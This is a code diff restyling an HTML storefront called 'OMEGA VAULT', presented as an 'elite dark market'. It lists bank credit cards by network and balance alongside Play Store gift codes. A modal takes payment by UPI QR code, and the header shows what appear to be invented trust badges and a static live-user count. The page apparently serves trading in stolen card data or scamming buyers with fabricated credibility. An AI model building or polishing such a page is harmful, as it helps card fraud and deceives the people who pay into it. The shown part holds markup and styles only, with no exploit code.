@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>✦ PHANTOM VAULT | ELITE DARK MARKET ✦</title>
+  <title>✦ OMEGA VAULT | PREMIUM DARK MARKET ✦</title>
   <style>
     * {
       margin: 0;
@@ -11,125 +11,78 @@
       box-sizing: border-box;
     }
 
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700;800&display=swap');
 
     :root {
-      --bg-dark: #05050a;
-      --bg-card: rgba(10, 10, 20, 0.6);
-      --neon-gold: #ffd700;
-      --neon-cyan: #00e5ff;
-      --neon-purple: #b000ff;
-      --neon-pink: #ff2d75;
-      --neon-green: #00ff88;
-      --neon-red: #ff3333;
-      --text-white: #ffffff;
-      --text-dim: #a0a0b0;
-      --glow-gold: 0 0 20px rgba(255, 215, 0, 0.5);
-      --glow-cyan: 0 0 20px rgba(0, 229, 255, 0.5);
-      --glow-purple: 0 0 20px rgba(176, 0, 255, 0.5);
+      --bg: #03030c;
+      --card-bg: rgba(12, 12, 24, 0.7);
+      --gold: #ffd966;
+      --gold-dark: #ccaa33;
+      --cyan: #00e5ff;
+      --purple: #b000ff;
+      --pink: #ff2d75;
+      --green: #00ff88;
+      --red: #ff4444;
+      --white: #ffffff;
+      --gray: #a0a0b5;
     }
 
     body {
-      background: var(--bg-dark);
-      font-family: 'Space Grotesk', 'Inter', sans-serif;
-      color: var(--text-white);
+      background: var(--bg);
+      font-family: 'Inter', sans-serif;
+      color: var(--white);
       min-height: 100vh;
       overflow-x: hidden;
-      cursor: default;
     }
 
-    /* 3D Animated Background */
-    .three-bg {
+    /* 3D CYBER BACKGROUND */
+    .bg-3d {
       position: fixed;
       inset: 0;
       z-index: 0;
-      overflow: hidden;
+      background: 
+        radial-gradient(ellipse at 20% 30%, rgba(255,217,102,0.08), transparent 50%),
+        radial-gradient(ellipse at 80% 70%, rgba(0,229,255,0.06), transparent 50%),
+        repeating-linear-gradient(45deg, rgba(255,255,255,0.01) 0px, rgba(255,255,255,0.01) 2px, transparent 2px, transparent 20px);
     }
 
-    .grid-3d {
-      position: absolute;
-      width: 200%;
-      height: 200%;
-      top: -50%;
-      left: -50%;
-      background-image: 
-        linear-gradient(rgba(0, 229, 255, 0.08) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0, 229, 255, 0.08) 1px, transparent 1px);
-      background-size: 60px 60px;
-      transform: rotateX(45deg) rotateZ(45deg);
-      animation: gridMove 20s linear infinite;
-    }
-
-    @keyframes gridMove {
-      0% { transform: rotateX(45deg) rotateZ(45deg) translate(0, 0); }
-      100% { transform: rotateX(45deg) rotateZ(45deg) translate(60px, 60px); }
-    }
-
-    .glow-orbs {
-      position: fixed;
-      inset: 0;
-      z-index: 0;
-    }
-
-    .orb {
-      position: absolute;
-      border-radius: 50%;
-      filter: blur(80px);
-      opacity: 0.4;
-      animation: orbFloat 15s infinite alternate;
-    }
-
-    .orb-1 { width: 400px; height: 400px; background: #ffd700; top: -150px; right: -100px; animation-duration: 12s; }
-    .orb-2 { width: 350px; height: 350px; background: #00e5ff; bottom: -100px; left: -100px; animation-duration: 18s; }
-    .orb-3 { width: 300px; height: 300px; background: #b000ff; top: 50%; left: 50%; transform: translate(-50%, -50%); animation-duration: 25s; }
-
-    @keyframes orbFloat {
-      0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
-      100% { transform: translate(50px, 50px) scale(1.2); opacity: 0.6; }
-    }
-
-    /* Floating Particles */
-    .particles-3d {
+    .floating-neon {
       position: fixed;
       inset: 0;
       z-index: 0;
       pointer-events: none;
     }
 
-    .particle-3d {
+    .neon-line {
       position: absolute;
-      width: 4px;
-      height: 4px;
-      background: radial-gradient(circle, #ffd700, #00e5ff);
-      border-radius: 50%;
-      opacity: 0;
-      animation: particleFloat 12s infinite;
+      background: linear-gradient(90deg, transparent, var(--gold), var(--cyan), transparent);
+      height: 2px;
+      width: 100%;
+      animation: slideLine 8s infinite;
     }
 
-    @keyframes particleFloat {
-      0% { transform: translateY(100vh) scale(0); opacity: 0; }
-      10% { opacity: 0.8; }
-      90% { opacity: 0.3; }
-      100% { transform: translateY(-20vh) scale(1.5); opacity: 0; }
+    @keyframes slideLine {
+      0% { transform: translateX(-100%); opacity: 0; }
+      50% { opacity: 0.5; }
+      100% { transform: translateX(100%); opacity: 0; }
     }
 
     .container {
       position: relative;
       z-index: 10;
-      max-width: 1500px;
+      max-width: 1600px;
       margin: 0 auto;
-      padding: 25px;
+      padding: 20px;
     }
 
-    /* KHATARNAK HEADER */
-    .header-killer {
-      background: rgba(5, 5, 10, 0.7);
-      backdrop-filter: blur(25px);
-      border-radius: 35px;
-      padding: 25px 35px;
-      margin-bottom: 35px;
-      border: 1px solid rgba(255, 215, 0, 0.3);
-      box-shadow: 0 0 40px rgba(255, 215, 0, 0.1);
+    /* HEADER - PREMIUM */
+    .premium-header {
+      background: rgba(5, 5, 15, 0.6);
+      backdrop-filter: blur(20px);
+      border-radius: 30px;
+      padding: 20px 30px;
+      margin-bottom: 30px;
+      border: 1px solid rgba(255, 217, 102, 0.3);
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -137,549 +90,516 @@
       gap: 20px;
     }
 
-    .logo-killer h1 {
+    .logo h1 {
       font-family: 'Orbitron', monospace;
-      font-size: 2.2rem;
-      font-weight: 900;
-      background: linear-gradient(135deg, #ffd700, #00e5ff, #b000ff);
+      font-size: 1.8rem;
+      background: linear-gradient(135deg, #ffd966, #00e5ff, #b000ff);
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
-      text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-      letter-spacing: -1px;
     }
-    .logo-killer p {
-      font-size: 0.65rem;
-      letter-spacing: 0.3em;
-      color: var(--text-dim);
-    }
-
-    .trust-seal {
-      display: flex;
-      gap: 20px;
-    }
-    .seal-item {
-      text-align: center;
-      padding: 10px 18px;
-      background: rgba(0, 0, 0, 0.5);
-      border-radius: 20px;
-      border: 1px solid rgba(0, 255, 136, 0.3);
-    }
-    .seal-icon { font-size: 1.5rem; }
-    .seal-text { font-size: 0.7rem; font-weight: 600; color: #00ff88; }
-
-    .live-stats {
-      display: flex;
-      gap: 30px;
-      align-items: center;
-    }
-    .live-stat {
-      text-align: center;
-    }
-    .live-number {
-      font-family: 'Orbitron', monospace;
-      font-size: 1.8rem;
-      font-weight: 800;
-      color: #ffd700;
-      text-shadow: 0 0 10px #ffd700;
-    }
-    .live-label {
+    .logo p {
       font-size: 0.6rem;
-      color: var(--text-dim);
+      letter-spacing: 0.2em;
+      color: var(--gray);
     }
-    .pulse-badge {
+
+    .trust-badges {
+      display: flex;
+      gap: 15px;
+    }
+    .badge {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 8px 16px;
+      border-radius: 30px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      color: #00ff88;
+    }
+
+    .live-counter {
       display: flex;
       align-items: center;
-      gap: 10px;
-      background: rgba(0, 255, 136, 0.15);
+      gap: 15px;
+      background: rgba(0, 0, 0, 0.5);
       padding: 8px 20px;
       border-radius: 50px;
       border: 1px solid rgba(0, 255, 136, 0.5);
     }
-    .pulse-dot-killer {
-      width: 12px;
-      height: 12px;
+    .live-dot {
+      width: 10px;
+      height: 10px;
       background: #00ff88;
       border-radius: 50%;
-      animation: pulseKiller 1.2s infinite;
-      box-shadow: 0 0 15px #00ff88;
+      animation: pulse 1.2s infinite;
     }
-    @keyframes pulseKiller {
+    .live-number {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: #00ff88;
+    }
+
+    @keyframes pulse {
       0%,100% { opacity: 1; transform: scale(1); }
       50% { opacity: 0.4; transform: scale(0.8); }
     }
 
-    /* TABS - 3D STYLE */
-    .tabs-killer {
+    /* TABS */
+    .tabs {
       display: flex;
       justify-content: center;
-      gap: 30px;
-      margin: 35px 0 30px;
+      gap: 20px;
+      margin: 30px 0;
     }
-    .tab-killer {
+    .tab {
       background: rgba(10, 10, 20, 0.8);
-      backdrop-filter: blur(20px);
-      border: 2px solid rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
       border-radius: 60px;
-      padding: 18px 45px;
+      padding: 12px 35px;
       cursor: pointer;
-      transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      transition: all 0.3s;
       text-align: center;
-      position: relative;
-      overflow: hidden;
     }
-    .tab-killer::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(0, 229, 255, 0.1));
-      opacity: 0;
-      transition: opacity 0.4s;
+    .tab:hover {
+      border-color: #ffd966;
+      transform: translateY(-3px);
     }
-    .tab-killer:hover::before { opacity: 1; }
-    .tab-killer:hover { transform: translateY(-5px); border-color: rgba(255, 215, 0, 0.5); }
-    .tab-killer.active {
-      border-color: #ffd700;
-      box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
-      background: linear-gradient(135deg, rgba(255, 215, 0, 0.15), rgba(0, 229, 255, 0.08));
+    .tab.active {
+      border-color: #ffd966;
+      box-shadow: 0 0 25px rgba(255, 217, 102, 0.3);
+      background: linear-gradient(135deg, rgba(255, 217, 102, 0.15), rgba(0, 229, 255, 0.05));
     }
-    .tab-icon-killer { font-size: 2rem; margin-bottom: 5px; }
-    .tab-title-killer { font-family: 'Orbitron', monospace; font-size: 1rem; font-weight: 700; }
-    .tab-sub-killer { font-size: 0.6rem; color: var(--text-dim); }
+    .tab-icon { font-size: 1.5rem; }
+    .tab-title { font-weight: 700; font-size: 0.9rem; }
 
     /* CONTROLS */
-    .controls-killer {
-      background: rgba(5, 5, 10, 0.6);
-      backdrop-filter: blur(20px);
-      border-radius: 35px;
-      padding: 25px 30px;
-      margin-bottom: 35px;
-      border: 1px solid rgba(255, 215, 0, 0.2);
+    .controls {
+      background: rgba(5, 5, 15, 0.5);
+      backdrop-filter: blur(15px);
+      border-radius: 25px;
+      padding: 20px 25px;
+      margin-bottom: 30px;
+      border: 1px solid rgba(255, 217, 102, 0.15);
     }
-    .ctrl-row { margin-bottom: 20px; }
-    .ctrl-title {
-      text-align: center;
-      font-family: 'Orbitron', monospace;
-      font-size: 0.7rem;
-      letter-spacing: 0.2em;
-      color: #ffd700;
-      margin-bottom: 15px;
-    }
-    .btn-group-killer {
+    .ctrl-group {
       display: flex;
       justify-content: center;
       flex-wrap: wrap;
-      gap: 15px;
+      gap: 12px;
+      margin-bottom: 15px;
     }
-    .btn-killer {
+    .ctrl-group:last-child { margin-bottom: 0; }
+    .ctrl-label {
+      width: 100%;
+      text-align: center;
+      font-size: 0.65rem;
+      letter-spacing: 0.15em;
+      color: var(--gray);
+      margin-bottom: 10px;
+    }
+    .ctrl-btn {
       background: rgba(0, 0, 0, 0.6);
-      border: 1.5px solid rgba(255, 255, 255, 0.08);
-      color: var(--text-dim);
-      padding: 12px 28px;
-      border-radius: 50px;
-      font-weight: 700;
-      font-size: 0.8rem;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      color: var(--gray);
+      padding: 8px 22px;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.3s;
-      text-transform: uppercase;
+      transition: all 0.2s;
     }
-    .btn-killer:hover {
-      border-color: #ffd700;
-      color: #ffd700;
-      transform: translateY(-3px);
-      box-shadow: 0 5px 20px rgba(255, 215, 0, 0.2);
+    .ctrl-btn:hover {
+      border-color: #ffd966;
+      color: #ffd966;
     }
-    .btn-killer.active {
-      background: linear-gradient(135deg, #ffd700, #ffaa00);
+    .ctrl-btn.active {
+      background: linear-gradient(135deg, #ffd966, #ccaa33);
+      color: #000;
       border-color: transparent;
-      color: #0a0a0a;
-      box-shadow: 0 0 25px rgba(255, 215, 0, 0.5);
     }
 
-    /* CARDS GRID - KHATARNAK */
-    .cards-grid-killer {
+    /* CARDS GRID */
+    .cards-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
-      gap: 35px;
+      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+      gap: 25px;
     }
 
-    /* 3D CARD */
-    .card-killer {
+    /* PREMIUM CARD */
+    .premium-card {
       background: linear-gradient(145deg, rgba(12, 12, 24, 0.9), rgba(6, 6, 16, 0.95));
       backdrop-filter: blur(15px);
-      border-radius: 40px;
+      border-radius: 32px;
       overflow: hidden;
-      border: 1px solid rgba(255, 215, 0, 0.2);
-      transition: all 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.2);
+      border: 1px solid rgba(255, 217, 102, 0.2);
+      transition: all 0.4s;
       cursor: pointer;
-      position: relative;
-      transform-style: preserve-3d;
     }
-    .card-killer:hover {
-      transform: translateY(-15px) scale(1.02);
-      border-color: #ffd700;
-      box-shadow: 0 35px 55px -20px rgba(0, 0, 0, 0.8), 0 0 35px rgba(255, 215, 0, 0.4);
+    .premium-card:hover {
+      transform: translateY(-10px);
+      border-color: #ffd966;
+      box-shadow: 0 25px 45px -15px rgba(0, 0, 0, 0.6), 0 0 25px rgba(255, 217, 102, 0.2);
     }
-
-    .card-glow-killer {
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.15), transparent);
-      transition: left 0.6s;
-      pointer-events: none;
-    }
-    .card-killer:hover .card-glow-killer { left: 100%; }
 
     .card-strip {
-      height: 4px;
-      background: linear-gradient(90deg, #ffd700, #00e5ff, #b000ff);
+      height: 3px;
+      background: linear-gradient(90deg, #ffd966, #00e5ff, #b000ff);
     }
-    .play-strip {
-      background: linear-gradient(90deg, #1a5bbf, #4285f4, #00e5ff);
+    .card-inner {
+      padding: 22px;
     }
-
-    .card-body {
-      padding: 25px;
-    }
-
-    .card-head-killer {
+    .card-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
-    .network-badge-killer {
-      background: rgba(255, 215, 0, 0.15);
-      border: 1px solid rgba(255, 215, 0, 0.4);
-      padding: 6px 20px;
-      border-radius: 40px;
-      font-weight: 800;
-      font-size: 0.75rem;
-      letter-spacing: 0.05em;
-      color: #ffd700;
+    .network {
+      background: rgba(255, 217, 102, 0.15);
+      border: 1px solid rgba(255, 217, 102, 0.3);
+      padding: 5px 16px;
+      border-radius: 30px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: #ffd966;
     }
-    .price-badge-killer {
+    .price {
       font-family: 'Orbitron', monospace;
-      font-size: 1.6rem;
+      font-size: 1.5rem;
       font-weight: 800;
-      color: #ffd700;
-      text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+      color: #ffd966;
     }
-
-    .card-number-killer {
-      font-family: 'Courier New', monospace;
-      font-size: 1rem;
-      letter-spacing: 0.1em;
+    .card-number {
+      font-family: monospace;
       background: rgba(0, 0, 0, 0.5);
-      padding: 14px;
-      border-radius: 22px;
+      padding: 12px;
+      border-radius: 18px;
       text-align: center;
-      margin: 18px 0;
-      border: 1px solid rgba(255, 215, 0, 0.2);
+      margin: 15px 0;
+      font-size: 0.9rem;
     }
-
-    .details-grid-killer {
+    .card-details {
       display: grid;
       grid-template-columns: 1fr 1fr 1fr;
-      gap: 15px;
-      margin: 20px 0;
+      gap: 12px;
+      margin: 18px 0;
     }
-    .detail-killer {
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 18px;
-      padding: 10px;
+    .detail {
+      background: rgba(0, 0, 0, 0.35);
+      padding: 8px;
+      border-radius: 14px;
       text-align: center;
     }
-    .detail-label-killer {
-      font-size: 0.55rem;
-      color: var(--text-dim);
-      text-transform: uppercase;
+    .detail-label {
+      font-size: 0.5rem;
+      color: var(--gray);
     }
-    .detail-value-killer {
-      font-size: 0.85rem;
+    .detail-value {
+      font-size: 0.75rem;
       font-weight: 700;
-      margin-top: 5px;
+      margin-top: 4px;
     }
 
-    /* BIG PURCHASE BUTTON */
-    .purchase-killer {
-      background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(204, 170, 51, 0.05));
-      border-top: 1px solid rgba(255, 215, 0, 0.3);
-      padding: 18px 25px;
+    /* PURCHASE BUTTON */
+    .purchase-btn {
+      background: linear-gradient(135deg, rgba(255, 217, 102, 0.1), rgba(204, 170, 51, 0.05));
+      border-top: 1px solid rgba(255, 217, 102, 0.3);
+      padding: 15px 22px;
       display: flex;
       justify-content: space-between;
       align-items: center;
       transition: all 0.3s;
-      cursor: pointer;
     }
-    .purchase-killer:hover {
-      background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(204, 170, 51, 0.1));
+    .purchase-btn:hover {
+      background: linear-gradient(135deg, rgba(255, 217, 102, 0.2), rgba(204, 170, 51, 0.1));
     }
-    .purchase-text-killer {
+    .purchase-text {
       font-weight: 800;
-      font-size: 1rem;
-      letter-spacing: 0.08em;
-      color: #ffd700;
+      font-size: 0.85rem;
+      letter-spacing: 0.05em;
+      color: #ffd966;
     }
-    .purchase-arrow-killer {
-      font-size: 1.5rem;
+    .purchase-arrow {
+      font-size: 1.3rem;
       transition: transform 0.3s;
     }
-    .card-killer:hover .purchase-arrow-killer {
-      transform: translateX(12px);
+    .premium-card:hover .purchase-arrow {
+      transform: translateX(8px);
     }
 
-    /* MODAL - PREMIUM */
-    .modal-killer {
+    /* MODAL - SAME PAGE QR */
+    .modal-overlay {
       display: none;
       position: fixed;
       inset: 0;
       z-index: 1000;
-      background: rgba(0, 0, 0, 0.98);
-      backdrop-filter: blur(50px);
+      background: rgba(0, 0, 0, 0.97);
+      backdrop-filter: blur(40px);
       align-items: center;
       justify-content: center;
-      padding: 20px;
     }
-    .modal-killer.open { display: flex; }
-    .modal-content-killer {
-      background: linear-gradient(145deg, #0a0a18, #050510);
-      border: 2px solid #ffd700;
-      border-radius: 60px;
-      max-width: 550px;
-      width: 100%;
+    .modal-overlay.open {
+      display: flex;
+    }
+    .modal-box {
+      background: linear-gradient(145deg, #0a0a18, #05050f);
+      border: 2px solid #ffd966;
+      border-radius: 50px;
+      max-width: 520px;
+      width: 90%;
       max-height: 90vh;
       overflow-y: auto;
-      box-shadow: 0 0 80px rgba(255, 215, 0, 0.4);
+      box-shadow: 0 0 80px rgba(255, 217, 102, 0.4);
     }
-    .modal-header-killer {
+    .modal-header {
       display: flex;
       justify-content: space-between;
-      padding: 25px 30px;
-      border-bottom: 1px solid rgba(255, 215, 0, 0.3);
+      padding: 22px 28px;
+      border-bottom: 1px solid rgba(255, 217, 102, 0.3);
     }
-    .modal-title-killer {
+    .modal-title {
       font-family: 'Orbitron', monospace;
-      font-size: 1.3rem;
+      font-size: 1.2rem;
       font-weight: 800;
-      color: #ffd700;
+      color: #ffd966;
     }
-    .modal-close-killer {
-      background: rgba(255, 215, 0, 0.1);
-      border: 1px solid #ffd700;
-      width: 45px;
-      height: 45px;
+    .modal-close {
+      background: rgba(255, 217, 102, 0.1);
+      border: 1px solid #ffd966;
+      width: 40px;
+      height: 40px;
       border-radius: 30px;
-      font-size: 1.5rem;
+      font-size: 1.3rem;
       cursor: pointer;
-      color: #ffd700;
+      color: #ffd966;
     }
-    .modal-body-killer { padding: 30px; }
+    .modal-body {
+      padding: 28px;
+    }
 
-    .apps-grid-killer {
+    /* QR SECTION - BIG VISIBLE */
+    .qr-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 30px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: center;
+    }
+    .qr-wrapper {
+      background: white;
+      padding: 20px;
+      border-radius: 25px;
+      display: inline-block;
+      margin: 10px auto;
+    }
+    .upi-address {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 10px;
+      border-radius: 20px;
+      font-family: monospace;
+      font-size: 0.8rem;
+      margin-top: 10px;
+      color: #ffd966;
+    }
+
+    /* PAYMENT APPS GRID */
+    .apps-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 20px;
+      gap: 15px;
       margin: 25px 0;
     }
-    .app-card-killer {
+    .app-card {
       background: #0c0c1a;
-      border: 1.5px solid rgba(255, 215, 0, 0.2);
-      border-radius: 28px;
-      padding: 18px;
+      border: 1px solid rgba(255, 217, 102, 0.2);
+      border-radius: 24px;
+      padding: 15px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 10px;
+      gap: 8px;
       cursor: pointer;
       transition: all 0.3s;
     }
-    .app-card-killer:hover {
-      border-color: #ffd700;
-      transform: translateY(-5px);
+    .app-card:hover {
+      border-color: #ffd966;
+      transform: translateY(-3px);
       background: #12122a;
     }
-    .app-icon-killer {
-      width: 60px;
-      height: 60px;
-      border-radius: 20px;
+    .app-icon {
+      width: 50px;
+      height: 50px;
+      border-radius: 16px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.5rem;
+      font-size: 1.3rem;
       font-weight: 800;
     }
 
-    .input-killer {
+    /* INPUTS */
+    .input-field {
       width: 100%;
       background: #0a0a14;
-      border: 1.5px solid rgba(255, 215, 0, 0.3);
+      border: 1px solid rgba(255, 217, 102, 0.3);
       border-radius: 50px;
-      padding: 16px 22px;
+      padding: 14px 20px;
       color: white;
-      font-size: 0.9rem;
       margin: 12px 0;
     }
-    .input-killer:focus {
+    .input-field:focus {
       outline: none;
-      border-color: #ffd700;
-      box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+      border-color: #ffd966;
+      box-shadow: 0 0 15px rgba(255, 217, 102, 0.3);
     }
-    .confirm-killer {
+    .confirm-btn {
       width: 100%;
-      background: linear-gradient(135deg, #ffd700, #ffaa00);
+      background: linear-gradient(135deg, #ffd966, #ccaa33);
       border: none;
-      border-radius: 60px;
-      padding: 18px;
+      border-radius: 50px;
+      padding: 16px;
       font-weight: 800;
-      font-size: 1rem;
-      letter-spacing: 0.1em;
+      font-size: 0.9rem;
       color: #0a0a0a;
       cursor: pointer;
       margin-top: 20px;
     }
-    .warning-killer {
-      font-size: 0.7rem;
+    .warning-text {
+      font-size: 0.65rem;
       color: #ff8888;
       text-align: center;
       margin-top: 15px;
-      padding: 12px;
+      padding: 10px;
       background: rgba(255, 68, 68, 0.1);
-      border-radius: 25px;
-    }
-    .qr-killer {
-      background: white;
-      padding: 20px;
-      border-radius: 35px;
-      display: flex;
-      justify-content: center;
-      margin: 20px 0;
+      border-radius: 20px;
     }
 
-    /* VERIFICATION - KHATARNAK */
-    .verify-killer {
+    /* VERIFICATION */
+    .verify-popup {
       display: none;
       position: fixed;
       inset: 0;
       z-index: 2000;
       background: rgba(0, 0, 0, 0.99);
-      backdrop-filter: blur(60px);
+      backdrop-filter: blur(50px);
       align-items: center;
       justify-content: center;
     }
-    .verify-killer.active { display: flex; }
-    .verify-card-killer {
-      background: linear-gradient(145deg, #0a0a18, #050510);
-      border: 2px solid #ffd700;
-      border-radius: 70px;
-      padding: 50px 40px;
+    .verify-popup.active {
+      display: flex;
+    }
+    .verify-card {
+      background: linear-gradient(145deg, #0a0a18, #05050f);
+      border: 2px solid #ffd966;
+      border-radius: 55px;
+      padding: 45px 40px;
       text-align: center;
-      max-width: 550px;
+      max-width: 480px;
       width: 90%;
-      box-shadow: 0 0 100px rgba(255, 215, 0, 0.5);
     }
-    .spinner-killer {
-      width: 75px;
-      height: 75px;
-      border: 4px solid rgba(255, 215, 0, 0.2);
-      border-top: 4px solid #ffd700;
+    .spinner {
+      width: 65px;
+      height: 65px;
+      border: 3px solid rgba(255, 217, 102, 0.2);
+      border-top: 3px solid #ffd966;
       border-radius: 50%;
-      animation: spinKiller 1s linear infinite;
-      margin: 0 auto 25px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
     }
-    @keyframes spinKiller { to { transform: rotate(360deg); } }
-    .verify-title-killer { font-size: 1.8rem; font-weight: 800; margin-bottom: 15px; }
-    .verify-desc-killer { font-size: 1rem; color: var(--text-dim); line-height: 1.6; }
-    .verify-close-killer {
-      background: linear-gradient(135deg, #ffd700, #ffaa00);
-      border: none;
-      border-radius: 50px;
-      padding: 14px 40px;
-      font-weight: 800;
-      margin-top: 25px;
-      cursor: pointer;
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .verify-icon { font-size: 3.5rem; margin-bottom: 15px; }
+    .verify-title { font-size: 1.4rem; font-weight: 800; margin-bottom: 10px; }
+    .verify-desc { font-size: 0.9rem; color: var(--gray); line-height: 1.5; }
 
-    .footer-killer {
+    .footer {
       text-align: center;
-      margin-top: 50px;
-      padding: 20px;
-      color: var(--text-dim);
-      font-size: 0.65rem;
-      letter-spacing: 0.15em;
+      margin-top: 45px;
+      padding: 15px;
+      color: var(--gray);
+      font-size: 0.6rem;
+      letter-spacing: 0.1em;
     }
     .hidden { display: none; }
-    .error-killer { color: #ff4444; font-size: 0.7rem; margin-top: 5px; display: none; }
-    .error-killer.show { display: block; }
+    .error-msg { color: #ff4444; font-size: 0.65rem; margin-top: -5px; margin-bottom: 8px; display: none; }
+    .error-msg.show { display: block; }
+    .input-error { border-color: #ff4444 !important; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 </head>
 <body>
-<div class="three-bg"><div class="grid-3d"></div></div>
-<div class="glow-orbs"><div class="orb orb-1"></div><div class="orb orb-2"></div><div class="orb orb-3"></div></div>
-<div class="particles-3d" id="particles3d"></div>
+<div class="bg-3d"></div>
+<div class="floating-neon"><div class="neon-line" style="top: 20%;"></div><div class="neon-line" style="top: 50%; animation-delay: 3s;"></div><div class="neon-line" style="top: 80%; animation-delay: 6s;"></div></div>
 
 <div class="container">
-  <!-- KHATARNAK HEADER -->
-  <div class="header-killer">
-    <div class="logo-killer"><h1>✦ PHANTOM VAULT ✦</h1><p>ELITE DARK MARKET | LEVEL 3 ACCESS</p></div>
-    <div class="trust-seal"><div class="seal-item"><div class="seal-icon">🔒</div><div class="seal-text">256-BIT SSL</div></div><div class="seal-item"><div class="seal-icon">✅</div><div class="seal-text">VERIFIED</div></div><div class="seal-item"><div class="seal-icon">⭐</div><div class="seal-text">4.9/5 RATING</div></div></div>
-    <div class="live-stats"><div class="live-stat"><div class="live-number" id="liveMain">198</div><div class="live-label">ACTIVE USERS</div></div><div class="pulse-badge"><div class="pulse-dot-killer"></div><span id="liveTextMain">198 ONLINE NOW</span></div></div>
+  <!-- PREMIUM HEADER -->
+  <div class="premium-header">
+    <div class="logo"><h1>✦ OMEGA VAULT ✦</h1><p>ELITE DARK MARKET • LEVEL 3 ACCESS</p></div>
+    <div class="trust-badges"><div class="badge">🔒 256-BIT SSL</div><div class="badge">✅ VERIFIED</div><div class="badge">⭐ 4.9/5 RATING</div></div>
+    <div class="live-counter"><div class="live-dot"></div><span class="live-number" id="liveCount">198</span><span>LIVE USERS</span></div>
   </div>
 
   <!-- TABS -->
-  <div class="tabs-killer"><div class="tab-killer active" id="tabMainCards"><div class="tab-icon-killer">💳</div><div class="tab-title-killer">BANK CARDS</div><div class="tab-sub-killer">PREMIUM CREDIT CARDS</div></div><div class="tab-killer" id="tabMainPlay"><div class="tab-icon-killer">🎮</div><div class="tab-title-killer">PLAY STORE</div><div class="tab-sub-killer">GIFT CARDS & CODES</div></div></div>
+  <div class="tabs"><div class="tab active" id="tabCards"><div class="tab-icon">💳</div><div class="tab-title">PREMIUM CARDS</div></div><div class="tab" id="tabPlay"><div class="tab-icon">🎮</div><div class="tab-title">PLAY STORE CODES</div></div></div>
 
   <!-- CONTROLS -->
-  <div id="cardsPanel"><div class="controls-killer"><div class="ctrl-row"><div class="ctrl-title">⚡ SORT BY</div><div class="btn-group-killer"><button class="btn-killer active" id="sortLowBtn">📉 LOW PRICE</button><button class="btn-killer" id="sortHighBtn">📈 HIGH PRICE</button><button class="btn-killer" id="sortBalanceBtn">💰 HIGH BALANCE</button></div></div><div class="ctrl-row"><div class="ctrl-title">🔮 FILTER NETWORK</div><div class="btn-group-killer"><button class="btn-killer active" data-filter="all">🌐 ALL</button><button class="btn-killer" data-filter="visa">💎 VISA</button><button class="btn-killer" data-filter="mastercard">🔴 MASTERCARD</button><button class="btn-killer" data-filter="amex">🔵 AMEX</button><button class="btn-killer" data-filter="rupay">🟣 RUPAY</button></div></div></div></div>
-  <div id="playPanel" class="hidden"><div class="controls-killer"><div class="ctrl-row"><div class="ctrl-title">⚡ SORT BY</div><div class="btn-group-killer"><button class="btn-killer active" id="playSortLowBtn">📉 LOW PRICE</button><button class="btn-killer" id="playSortHighBtn">📈 HIGH PRICE</button><button class="btn-killer" id="playSortValueBtn">💰 HIGH VALUE</button></div></div></div></div>
+  <div id="cardsCtrl"><div class="controls"><div class="ctrl-label">⚡ SORT BY</div><div class="ctrl-group"><button class="ctrl-btn active" id="sortLow">📉 LOW PRICE</button><button class="ctrl-btn" id="sortHigh">📈 HIGH PRICE</button><button class="ctrl-btn" id="sortBalance">💰 HIGH BALANCE</button></div><div class="ctrl-label">🔮 FILTER NETWORK</div><div class="ctrl-group"><button class="ctrl-btn active" data-filter="all">🌐 ALL</button><button class="ctrl-btn" data-filter="visa">💎 VISA</button><button class="ctrl-btn" data-filter="mastercard">🔴 MASTERCARD</button><button class="ctrl-btn" data-filter="amex">🔵 AMEX</button><button class="ctrl-btn" data-filter="rupay">🟣 RUPAY</button></div></div></div>
